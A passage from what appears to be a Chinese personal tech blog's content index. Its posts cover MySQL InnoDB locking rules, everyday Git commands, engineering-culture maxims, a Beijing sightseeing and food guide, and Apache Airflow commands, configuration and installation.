title="行锁和表锁"></a>行锁和表锁</h4></li></ul><blockquote><ol><li>只根据主键进行查询，并且查询到数据，主键字段产生行锁。</li><li>除了使用非主键不含索引字段查询，其余所有的查询，没有查询到数据，就不产生锁。</li><li>根据主键、非主键含索引（name）进行查询，并且查询到数据，主键字段产生行锁，name字段产生行锁。<pre class="line-numbers language-none"><code class="language-none">begin;select * from goods where id &#x3D; 1 and name&#x3D;&#39;prod11&#39; for update;commit;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>根据主键、非主键不含索引（name）进行查询，并且查询到数据，如果其他线程按主键字段进行再次查询，则主键字段产生行锁，如果其他线程按非主键不含索引字段进行查询，则非主键不含索引字段产生表锁，如果其他线程按非主键含索引字段进行查询，则非主键含索引字段产生行锁，如果索引值是枚举类型，mysql也会进行表锁。</li><li>根据非主键含索引（name）进行查询，并且查询到数据，name字段产生行锁。</li><li>根据非主键不含索引（name）进行查询，查到或查不到数据，name字段产生表锁。</li><li>只根据主键进行查询，查询条件为不等于，查到或查不到数据，主键字段产生都表锁。</li><li>只根据主键进行查询，查询条件为 like，查到或查不到数据，主键字段产生表锁。</li></ol></blockquote><ul><li><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4></li></ul><blockquote><ol><li>InnoDB行锁是通过给索引上的索引项加锁来实现的，只有通过索引条件检索数据，InnoDB才使用行级锁，否则，InnoDB将使用表锁。&#x3D;&#x3D;行锁一定有索引&#x3D;&#x3D;</li><li>当表有多个索引的时候，不同的事务可以使用不同的索引锁定不同的行，另外，不论是使用主键索引、唯一索引或普通索引，InnoDB都会使用行锁来对数据加锁。 </li><li>如果MySQL认为全表扫描效率更高，比如对一些很小的表，它就不会使用索引，这种情况下InnoDB将使用表锁，而不是行锁。</li><li>检索值的&#x3D;&#x3D;数据类型&#x3D;&#x3D;与索引字段不同，虽然MySQL能够进行数据类型转换，但却不会使用索引，从而导致InnoDB使用表锁。</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-常用命令整理</title>
      <link href="/uncatesgorized/2021-03-07-Git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Git-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="远程分支强制覆盖本地分支-超级常用"><a href="#远程分支强制覆盖本地分支-超级常用" class="headerlink" title="远程分支强制覆盖本地分支(超级常用)"></a>远程分支强制覆盖本地分支(超级常用)</h4><p>置顶是因为我自己用了无数遍呀！！</p><pre class="line-numbers language-none"><code class="language-none">git fetch --allgit reset --hard origin&#x2F;your branch namegit pull<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="快捷提交"><a href="#快捷提交" class="headerlink" title="快捷提交"></a>快捷提交</h4><pre class="line-numbers language-none"><code class="language-none">git commit -a -m &#39;this is my commit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等价于</p><pre class="line-numbers language-none"><code class="language-none">git add .git commit -m &#39;your commit&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="命令简写-mac环境，windows没试"><a href="#命令简写-mac环境，windows没试" class="headerlink" title="命令简写(mac环境，windows没试)"></a>命令简写(mac环境，windows没试)</h4><p>命令行输入：</p><pre class="line-numbers language-none"><code class="language-none">alias<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>会列出所有git相关的缩写，当然也可以自己配。<br><img src="https://img-blog.csdnimg.cn/20190526223820765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="alias"><br>常用的也就几个：</p><pre class="line-numbers language-none"><code class="language-none">切换指定分支：gco branch_name切换到master分支：gcm查看分支：gb查看修改：gd拉代码：gl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="新建没有parent的新分支"><a href="#新建没有parent的新分支" class="headerlink" title="新建没有parent的新分支"></a>新建没有parent的新分支</h4><pre class="line-numbers language-none"><code class="language-none">git checkout --orphan branch-name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Git-代码量"><a href="#Git-代码量" class="headerlink" title="Git 代码量"></a>Git 代码量</h4><pre class="line-numbers language-none"><code class="language-none">git log --format&#x3D;&#39;%aN&#39; | sort -u | while read name; do echo -en &quot;$name\t&quot;; git log --author&#x3D;&quot;$name&quot; --pretty&#x3D;tformat: --numstat | awk &#39;&#123; add +&#x3D; $1; subs +&#x3D; $2; loc +&#x3D; $1 - $2 &#125; END &#123; printf &quot;added lines: %s, removed lines: %s, total lines: %s\n&quot;, add, subs, loc &#125;&#39; -; done<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Git-命令提示：perl-warning-Setting-locale-failed"><a href="#Git-命令提示：perl-warning-Setting-locale-failed" class="headerlink" title="Git 命令提示：perl: warning: Setting locale failed."></a>Git 命令提示：perl: warning: Setting locale failed.</h4><pre class="line-numbers language-none"><code class="language-none">vim  ~&#x2F;.zshrc# Setting for the new UTF-8 terminal support in LionLC_CTYPE&#x3D;en_US.UTF-8LC_ALL&#x3D;en_US.UTF-8source ~&#x2F;.zshrc重启iTerm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="merge某个或几个commit"><a href="#merge某个或几个commit" class="headerlink" title="merge某个或几个commit"></a>merge某个或几个commit</h4><p>有些特殊情况不能直接merge(一个分支上同时有你和别人的commit)，但是你的commit需要上线了。</p><ul><li>查找要merge的commitId<pre class="line-numbers language-none"><code class="language-none">gco old_branchgit log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>commit 1534c530522982a6ff050ac420b300ae4364474e<br>Author: lidoudou &lt;<a href="mailto:&#108;&#x69;&#100;&#111;&#x75;&#x64;&#111;&#x75;&#x40;&#x63;&#115;&#x64;&#x6e;&#x2e;&#x63;&#111;&#109;">&#108;&#x69;&#100;&#111;&#x75;&#x64;&#111;&#x75;&#x40;&#x63;&#115;&#x64;&#x6e;&#x2e;&#x63;&#111;&#109;</a>&gt;<br>Date:   Sat Apr 27 17:15:14 2019 +0800<br> update kafka setting</p></blockquote></li><li>切换到目标分支，pick目标commit<pre class="line-numbers language-none"><code class="language-none">gco new_branchgit cherr-pick 1534c530522  &#x2F;&#x2F; commitId<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>正常的话现在可以看到new_branch上有了commitId不同，但是标识名相同的记录。</li><li>当然也会出现意外——代码冲突了，按一般的冲突一样fix就OK了。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>优秀工程师文化</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/About-%E4%BC%98%E7%A7%80%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/About-%E4%BC%98%E7%A7%80%E5%B7%A5%E7%A8%8B%E5%B8%88%E6%96%87%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h4 id="自我认识"><a href="#自我认识" class="headerlink" title="自我认识"></a>自我认识</h4><ul><li><code>有深刻的认知和认同</code></li><li><strong>暂时没有做到或没有切身体会</strong></li></ul><h4 id="优秀的工程师文化最基本三要素"><a href="#优秀的工程师文化最基本三要素" class="headerlink" title="优秀的工程师文化最基本三要素"></a>优秀的工程师文化最基本三要素</h4><ul><li>尊重</li><li>信任</li><li>责任</li></ul><h4 id="工程师文化"><a href="#工程师文化" class="headerlink" title="工程师文化"></a>工程师文化</h4><ol><li><code>团队才是王道</code></li><li><code>快速失败，学习，迭代</code></li><li><code>为学习预留时间</code>，<code>保持学习耐心</code></li><li><code>必须坦诚，隐瞒是有害的</code></li><li><code>学会批评和接受批评</code></li><li>所谓强壮的文化，是能接受有益的改变，抵御有害的变化</li><li><code>建设团队文化并不是负责人的事，团队所有成员都有份</code></li><li><code>团队文化从招聘开始，技术再牛，如果步调跟团队不一致，往往会成为一个很大的不确定因素</code></li><li>想要优秀的工程师为自己工作，首要的是雇佣出色的工程师</li><li>每个人都对产品的成功抱有强烈的主人翁精神和责任感，初创团队成员更应有这种意识建设性批评是工程团队的成长基石</li><li>诤友难得</li><li><code>同步沟通的时候人越少越好（开会，群讨论）</code>，异步沟通的时候听众越多越好（邮件）能够参加会议跟身份地位等同起来的做法是极其愚蠢的</li><li>时间尚早但议题已经讨论完毕，立刻散会</li><li><code>不做设计，直接写代码的行为是不可取的</code></li><li>任何warning都可能要了你的命</li><li>每个提交都必须经过代码审查</li><li><code>真正的测试和发布流程</code></li><li>负责人要做李云龙式的冲锋队长不要学诸葛亮运筹帷幄</li><li>理解每一位员工的困难，萝卜加大棒式的管理方式不适合现在企业</li><li><code>做一个禅师，保持淡定和冷静</code></li><li><code>学会提问式沟通，</code>不要随便给人打标签<code>，任何人都会成长</code></li><li>培养敢于冒险精神的氛围</li><li><code>称赞同事可以，但是每个人都称赞那叫“互吹”</code></li><li>团队想要在一个方向上快速前进就要让所有人同心协力，步调必须一致</li><li>多关心下同伴在工作之外的情况是很有必要的</li><li>对同伴需要更多的激励和方向指引</li><li><code>独立工作不需要别人看着才能工作</code></li><li><code>学习新技能，在现有基础上继续磨练得到提高是一个工程师职业生涯的续命丹药</code></li><li><code>需要给自己目标，长期目标，短期目标</code></li><li>快速走出负面情绪</li><li>不是要把“烂人”轰走，而是要培养一种拒绝负面行为的文化氛围</li><li><code>尊重别人的时间</code></li><li>不要过分的索取</li><li><strong>转移完美主义者的注意力</strong></li><li>知道什么时候放弃</li><li><code>在完成自己工作的前提下，要求更多的责任</code></li><li>敢于冒险，不怕失败</li><li><code>对不确定的事情提出疑问</code></li><li><code>在leader问你进展之前，主动汇报</code>。遇到的困难、完成任务、需要帮助，或者不希望什么事情发生</li><li>不尊重工程师的公司，只把他们当实现商业目的工具的公司，工程师不会对这家公司有任何感情</li><li>过度的向上管理不可取</li><li>要分清什么是进取型工作什么是防御性工作</li><li><code>要有自己的偶像</code>，并向偶像模仿，提高</li><li>如果不努力去学习、了解引导公司的方法，那就等于拿自己的命运去赌博</li><li>大而全的系统往往是完美主义者的臆想</li><li>最好不要纸上谈兵，架构不是设计出来的，是优化出来的</li><li><code>懒惰是千万要小心的陷阱</code></li></ol>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>北京</title>
      <link href="/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8C%97%E4%BA%AC/"/>
      <url>/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/About-%E5%8C%97%E4%BA%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>如果准备来北京，需要准备几件事。</p><ul><li>提前想好要去哪(下面有参考)，逐个查一下需不需要预约预约预约。这个最重要，可以找我帮着约。</li><li>如果去有历史文化背的地方，最好提前准备点背景知识。走累了比较容易忽略很多应该亲眼一看的东西，后知后觉到家了才拍大腿。</li><li>适当取舍，不要安排太狠太多，腰和腿都受不了</li><li>地铁基本可以到90%的景点，但是如果特种兵每天都安排的很紧凑，直接打车到门口。</li></ul><h2 id="北京景点"><a href="#北京景点" class="headerlink" title="北京景点"></a>北京景点</h2><p>北京一共有8个5A（每年评级可能会变）。我的理论是，如果对一个地方不够了解，那就无脑冲5A，虽然也有不少早该被摘掉这个头衔的景区，但结合网上的评价选择，总比冲网红点强。</p><table><thead><tr><th align="center">名称</th><th>位置</th><th>说明</th></tr></thead><tbody><tr><td align="center">八达岭长城</td><td>延庆，公交可到</td><td>远。【旺季】每年4月1日至10月31日</td></tr><tr><td align="center">颐和园</td><td></td><td>费腿</td></tr><tr><td align="center">奥林匹克公园</td><td></td><td>除了鸟巢水立方没什么</td></tr><tr><td align="center">明十三陵</td><td></td><td>远。查明朝历史</td></tr><tr><td align="center">圆明园</td><td></td><td>查谁建的，谁毁的</td></tr><tr><td align="center">天坛</td><td></td><td>费腿，封面。</td></tr><tr><td align="center">恭王府</td><td></td><td>费腿，和珅、还珠格格取景</td></tr><tr><td align="center">故宫博物院</td><td></td><td>费腿。查每个殿的功能，每个宫的主人</td></tr></tbody></table><p>5A之外，北京作为文化中心，也有相当多值得亲自去一下的地方，主要是4A。历史书里的一张图、语文课本里的一首诗、电视剧里的一个景，耳朵里的一首歌…，这些元素，北京一定是浓度最高地方。写<strong>紧挨着</strong>的地方就是过马路就能到。</p><table><thead><tr><th align="center">名称</th><th align="center">位置</th><th>说明</th></tr></thead><tbody><tr><td align="center">天安门+广场</td><td align="center"></td><td>天安门可以上、毛主席纪念堂可以进、升国旗可以看，都得预约</td></tr><tr><td align="center">国家博物馆</td><td align="center">天安门广场东，紧挨着</td><td>历史书内容浓度最高，能约到的话最好去。大，去的话留一下午时间。</td></tr><tr><td align="center">人民大会堂</td><td align="center">天安们广场西，紧挨着</td><td>有时候可以进，看哪天能约。亲眼看一下新闻联播里的地方</td></tr><tr><td align="center">中山公园</td><td align="center">天安门西，紧挨着</td><td>没什么东西，原来是社稷坛。纪念孙中山改为中山公园，时间不多可以不去</td></tr><tr><td align="center">大栅栏</td><td align="center">天安门广场南走一会儿</td><td>3A商业街，放最后，逛完还有劲可以路过一下</td></tr><tr><td align="center">景山公园</td><td align="center">故宫北门出去，过马路就是公园南门</td><td>俯瞰故宫，和北中轴线。故宫全貌的图在这里拍</td></tr><tr><td align="center">什刹海</td><td align="center">恭王府北</td><td>环境挺好，名人故居、酒吧街，边上是南锣鼓巷</td></tr><tr><td align="center">北海公园</td><td align="center">景山公园西，恭王府南，紧挨着</td><td>白塔，让我们荡起双桨</td></tr><tr><td align="center">雍和宫</td><td align="center"></td><td>北京最大的藏传佛教寺院，雍正发家的地方。人多，有梦想的可以去求一下</td></tr><tr><td align="center">地坛公园</td><td align="center">雍和宫北边，紧挨着</td><td>就是个普通公园，可以不去。史铁生《我与地坛》</td></tr><tr><td align="center">孔庙和国子监</td><td align="center">雍和宫西边，紧挨着</td><td>有情怀的去，或者雍和宫完了还有力气的可以去</td></tr><tr><td align="center">中央电视塔</td><td align="center"></td><td>上面是个旋转自助餐厅，菜一般但是边吃边转。最上层是观景台，天气好可以看见全北京。</td></tr><tr><td align="center">玉渊潭公园</td><td align="center">中央电视塔对面，紧挨着</td><td>没樱花的时候不去</td></tr><tr><td align="center">世界公园</td><td align="center"></td><td>世界各地名胜的微缩，时间有剩余可以去</td></tr><tr><td align="center">朝阳公园</td><td align="center"></td><td>大公园</td></tr><tr><td align="center">北京欢乐谷</td><td align="center"></td><td></td></tr><tr><td align="center">环球影城</td><td align="center"></td><td></td></tr><tr><td align="center">香山公园</td><td align="center"></td><td>没红叶的时候不用去</td></tr><tr><td align="center">动物园</td><td align="center"></td><td>带小孩可以考虑去</td></tr><tr><td align="center">海洋馆</td><td align="center"></td><td>带小孩可以考虑去</td></tr><tr><td align="center">北京天文馆</td><td align="center"></td><td>带小孩可以考虑去</td></tr><tr><td align="center">宋庆龄故居</td><td align="center"></td><td>3A，北海边上，可去可不去</td></tr><tr><td align="center">———–</td><td align="center">——————————-</td><td>——————————————————-</td></tr><tr><td align="center">潘家园</td><td align="center"></td><td>相对出名的古董市场？</td></tr><tr><td align="center">798艺术区</td><td align="center"></td><td>时尚、艺术、文艺青年聚集？</td></tr><tr><td align="center">三里屯</td><td align="center"></td><td>酒吧？</td></tr><tr><td align="center">王府井</td><td align="center"></td><td>购物？</td></tr><tr><td align="center">南锣鼓巷</td><td align="center"></td><td>商业街？</td></tr><tr><td align="center">北大清华</td><td align="center"></td><td></td></tr></tbody></table><h2 id="住-行"><a href="#住-行" class="headerlink" title="住&amp;行"></a>住&amp;行</h2><p><img src="https://imgbdb4.bendibao.com/bjbdb/202412/13/20241213172847_31099.jpg"></p><h2 id="吃"><a href="#吃" class="headerlink" title="吃"></a>吃</h2><p>衣、住不用解释，穿什么的都有，住哪也都行。特色的吃的想想其实也没几个，下面列一些，有些应该试，不一定好吃，但如果不试试，你大概也不甘心，可以多一份记忆。</p><ul><li>烤鸭<ul><li>四季民福（绝大多数的北京菜）</li></ul></li><li>铜锅涮肉<ul><li>就是个形式，没海底捞好吃</li></ul></li><li>炸酱面<ul><li>尝一碗，我觉得一般</li></ul></li><li>豌豆黄<ul><li>好多地方都有类似的点心</li></ul></li><li>卤煮火烧<ul><li>可以试，多人买一份。不是所有人都能吃的了</li></ul></li><li>炒肝<ul><li>可以试，多人买一份</li></ul></li><li>糖耳朵<ul><li>看着又油又甜，尝不尝都行</li></ul></li><li>驴打滚<ul><li>可以试，少买</li></ul></li><li>爆肚<ul><li>麻酱调牛肚。可以试，吃饭的时候有这个菜点一个就行，好多店都有</li></ul></li><li>糖火烧<ul><li>味道还行，平时吃饭会买</li></ul></li><li>豆汁<ul><li>无论几个人，只买一小碗，不买你又不甘心。每人尝一口就结束了，绝对不会喝第二口。</li></ul></li><li>焦圈<ul><li>一般是和豆汁一起，也不好吃</li></ul></li><li>麻豆腐<ul><li>豆腐渣做的</li></ul></li><li>炙子烤肉<ul><li>铁板烤肉。好多店都有，类似葱爆牛肉羊肉</li></ul></li><li>北冰洋<ul><li>北京汽水</li></ul></li><li>特别推荐👍<ul><li>紫光园——扒肉条</li></ul></li><li>特别不推荐🙅<ul><li>京酱肉丝</li></ul></li></ul><h2 id="回家特产"><a href="#回家特产" class="headerlink" title="回家特产"></a>回家特产</h2><p>北京的特点就是没特产，数的出来的算 稻香村，可以自己挑种类。但是很尴尬全是甜的，买一盒吃不了，又只能按盒买。烤鸭就不用考虑了，袋装能带回去的都不如家里超市买的。北京酥糖，果铺，茯苓饼，牛栏山？</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件-Airflow进阶</title>
      <link href="/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E8%BF%9B%E9%98%B6/"/>
      <url>/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><hr><p><strong>用户界面也有以下相关操作按钮</strong></p><ul><li><p>查看</p><pre class="line-numbers language-none"><code class="language-none">1、列出现有所有的活动的DAGS  airflow list_dags2、列出 tutorial 的任务id  airflow list_tasks tutorial3、以树形图的形式列出 tutorial 的任务id  airflow list_tasks tutorial --tree<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>测试</p><pre class="line-numbers language-none"><code class="language-none">1、模拟2015-06-01 执行tutorial的print_date任务  airflow test tutorial print_date 2015-06-01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>回填数据</p><blockquote><p>如果希望新写的DAG执行过去一段时间的任务怎么办？<br>backfill 可以执行一个时间段内应该执行的所有任务</p></blockquote><pre class="line-numbers language-none"><code class="language-none">airflow backfill tutorial -s 2018-06-01 -e 2015-08-01<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>重建元数据库</p><pre class="line-numbers language-none"><code class="language-none">airflow resetdb [-h] [-y]-y --yes，不经过提示确认就重置，默认为False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h5 id="更多命令-官方Command-Line-Interface"><a href="#更多命令-官方Command-Line-Interface" class="headerlink" title="更多命令  官方Command Line Interface"></a>更多命令  <a href="http://airflow.incubator.apache.org/cli.html">官方Command Line Interface</a></h5><hr><h2 id="BaseOperator"><a href="#BaseOperator" class="headerlink" title="BaseOperator"></a>BaseOperator</h2><p>官网例子，里面的各个属性有代表什么意思？</p><pre class="line-numbers language-none"><code class="language-none">&quot;&quot;&quot;Code that goes along with the Airflow tutorial located at:https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;incubator-airflow&#x2F;blob&#x2F;master&#x2F;airflow&#x2F;example_dags&#x2F;tutorial.py&quot;&quot;&quot;from airflow import DAGfrom airflow.operators.bash_operator import BashOperatorfrom datetime import datetime, timedeltadefault_args &#x3D; &#123;    &#39;owner&#39;: &#39;airflow&#39;,    &#39;depends_on_past&#39;: False,    &#39;start_date&#39;: datetime(2015, 6, 1),    &#39;email&#39;: [&#39;airflow@example.com&#39;],    &#39;email_on_failure&#39;: False,    &#39;email_on_retry&#39;: False,    &#39;retries&#39;: 1,    &#39;retry_delay&#39;: timedelta(minutes&#x3D;5),    # &#39;queue&#39;: &#39;bash_queue&#39;,    # &#39;pool&#39;: &#39;backfill&#39;,    # &#39;priority_weight&#39;: 10,    # &#39;end_date&#39;: datetime(2016, 1, 1),&#125;dag &#x3D; DAG(&#39;tutorial&#39;, default_args&#x3D;default_args)# t1, t2 and t3 are examples of tasks created by instantiating operatorst1 &#x3D; BashOperator(    task_id&#x3D;&#39;print_date&#39;,    bash_command&#x3D;&#39;date&#39;,    dag&#x3D;dag)t2 &#x3D; BashOperator(    task_id&#x3D;&#39;sleep&#39;,    bash_command&#x3D;&#39;sleep 5&#39;,    retries&#x3D;3,    dag&#x3D;dag)templated_command &#x3D; &quot;&quot;&quot;    &#123;% for i in range(5) %&#125;        echo &quot;&#123;&#123; ds &#125;&#125;&quot;        echo &quot;&#123;&#123; macros.ds_add(ds, 7)&#125;&#125;&quot;        echo &quot;&#123;&#123; params.my_param &#125;&#125;&quot;    &#123;% endfor %&#125;&quot;&quot;&quot;t3 &#x3D; BashOperator(    task_id&#x3D;&#39;templated&#39;,    bash_command&#x3D;templated_command,    params&#x3D;&#123;&#39;my_param&#39;: &#39;Parameter I passed in&#39;&#125;,    dag&#x3D;dag)t2.set_upstream(t1)t3.set_upstream(t1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li><strong>retries</strong> (int) 重试几次才标记为失败</li><li><strong>retry_delay</strong> (timedelta) 两次重试间隔多长时间</li><li><strong>retry_exponential_backoff</strong>（bool）在重试延迟上运用算法增加等待时间</li><li><strong>max_retry_delay</strong> (timedelta)  重试之间的最大时间间隔</li><li><strong>start_time</strong> （datatime）确定第一个任务实例的execution_date，最佳做法是将start_date四舍五入到DAG的schedule_interval。</li><li><strong>end_time</strong> （datetime）如果指定，调度程序将不会超出此日期。</li><li><strong>depends_on_past</strong> （bool）设置为true时，任务实例将依次运行，同时依赖上一个任务的计划成功。允许start_date的任务实例运行。</li><li><strong>wait_for_downstream</strong> （bool）TODO</li><li><strong>dag</strong> (DAG) 任务所附的dag的引用（如果有的话）</li><li>parallelism：这个参数指定了整个Airflow系统，在任何一刻能同时运行的Task Instance的数量，这个数量跟DAG无关，只跟Executor和Task有关。举个例子：如果parallelism&#x3D;15, 这时你有两个DAG，A和B，如果A需要同时开跑10个Task，B也要同时开跑10个Task，两个DAG同时触发，那么这时候同时在跑的Task数量只能是15，其余的5个会等之前的Task运行完了触发，这时的状态不会显示在web上。而且在这种情况下，触发的顺序是不确定的。</li></ol></blockquote><blockquote><ol start="11"><li>dag_concurrency：这个参数指定了同一个Dag Run中能同时运行的Task Instance的个数</li></ol></blockquote><blockquote><ol start="12"><li>max_active_runs_per_dag：这个参数指定了同一个Dag能被同时激活的Dag Run的数量</li></ol></blockquote><blockquote><ol start="13"><li>non_pooled_task_slot_count：这个参数指定了默认的Pool能同时运行的Task Instance的数量，如果你的Task没有指定Pool选项，那么这个Task就是属于这个默认的Pool的</li><li><a href="https://www.cnblogs.com/skyrim/p/7456166.html">更多配置</a></li></ol></blockquote><h2 id="airflow执行组件"><a href="#airflow执行组件" class="headerlink" title="airflow执行组件"></a>airflow执行组件</h2><ul><li>Scheduler：这个是整个Airflow的调度器，Airflow所有DAG的调度过程是由Scheduler轮询来处理的。触发条件达到后，会丢给Executor执行。</li><li>Executor：现在的Executor有三种：</li></ul><blockquote><ul><li>SequnceExecutor：提供本地执行，并且串行执行一个DAG中的所有Task，基本上只用在初期的Airflow概念验证阶段    </li><li>LocalExecutor：这个是比较常用的Executor，可以在本地并行执行一个DAG内的所有Task    </li><li>CeleryExecutor：这个是在大型任务调度场景，或者是表较复杂的任务分离场景中需要用到的Executor。顾名思义，在这个Executor下，Airflow使用了Celery这个强大的Python分布式队列框架去分发任务，然后在这样的环境下，需要在执行任务的机器上启用Airflow Worker来处理队列中的请求。 </li><li>在一个Airflow中同时只能一个Executor启动，不能给指定的DAG指定Executor</li></ul></blockquote><ul><li>Pool：这个Pool虽然不是Airflow的核心，但也跟整个Airflow的执行流程相关。任何一个Task其实都是指定了Pool这个参数的，即使没有自己指定，其实也是归结到了Default Pool这么个池子中。Pool本身是个抽象的概念，由Slot组成，可以建立任何一个Pool，指定Slot的数量。任何一个使用了这个Pool的Task Instance就需要占用一个Slot，Slot用完了，Task就处于等待状态。</li></ul><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ul><li>配置元素优先级<blockquote><p>环境变量<br>  airflow.cfg中的配置<br>  airflow.cfg中的命令<br>  默认</p></blockquote></li></ul><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><ul><li>官方推荐 MySQL or Postgres 两种数据库</li><li>本地配置好数据库后<blockquote><p>在airflow.cfg 中配置“executor”为“LocalExecutor”，可以在本地并行化任务实例的执行程序。</p></blockquote></li></ul><h5 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h5><p><a href="http://wingerted.com/">http://wingerted.com</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Airflow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>软件-Airflow安装与简单使用</title>
      <link href="/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/"/>
      <url>/uncatesgorized/2021-03-07-%E8%BD%AF%E4%BB%B6-Airflow%E5%AE%89%E8%A3%85%E4%B8%8E%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><ul><li><p>1、新建一个虚拟环境</p><pre class="line-numbers language-none"><code class="language-none">virtualenv airflowenvsource airflowenv&#x2F;bin&#x2F;activate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>2、安装airflow<br> 需要等一段时间</p><pre class="line-numbers language-none"><code class="language-none">pip install airflow&#x3D;&#x3D;1.8.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>3、查看安装结果</p><pre class="line-numbers language-none"><code class="language-none">airflow version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>出现如下则说明安装成功</p><pre class="line-numbers language-none"><code class="language-none">____________       _________________    |__( )_________  __&#x2F;__  &#x2F;________      ______  &#x2F;| |_  &#x2F;__  ___&#x2F;_  &#x2F;_ __  &#x2F;_  __ \_ | &#x2F;| &#x2F; &#x2F;___  ___ |  &#x2F; _  &#x2F;   _  __&#x2F; _  &#x2F; &#x2F; &#x2F;_&#x2F; &#x2F;_ |&#x2F; |&#x2F; &#x2F;_&#x2F;_&#x2F;  |_&#x2F;_&#x2F;  &#x2F;_&#x2F;    &#x2F;_&#x2F;    &#x2F;_&#x2F;  \____&#x2F;____&#x2F;|__&#x2F;v1.8.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote></li><li><p>4、cd 进入airflow文件夹</p><pre class="line-numbers language-none"><code class="language-none">ls -al<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><pre class="line-numbers language-none"><code class="language-none">有以下两个文件-rw-r--r--   1 ***  staff  11602  8 28 18:06 airflow.cfg-rw-r--r--   1 ***  staff   1549  8 27 12:31 unittests.cfg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>airflow.cfg有许多<strong>配置项</strong>，后面会作简单解释</p></blockquote></li><li><p>5、初始化airflow数据库</p><pre class="line-numbers language-none"><code class="language-none">airflow initdb默认配置使用SQLLite，执行后在airflow文件夹生成一个airflow.db数据库文件（可以通过配置airflow.cfg的方式更改数据库类型如：mysql）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>6、启动服务</p><pre 